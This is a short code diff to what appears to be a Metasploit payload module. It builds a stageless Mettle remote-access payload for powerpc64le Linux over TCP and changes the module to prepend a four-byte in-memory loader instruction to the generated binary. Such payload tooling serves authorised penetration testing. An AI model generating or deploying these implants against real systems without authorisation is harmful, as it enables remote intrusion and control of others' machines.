@@ -38,6 +38,8 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('powerpc64le-linux-musl', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('powerpc64le-linux-musl', generate_config(opts)).to_binary :exec
+    in_memory_loader_asm = [0x1422667c].pack("V*")
+    in_memory_loader_asm + payload
   end
 end
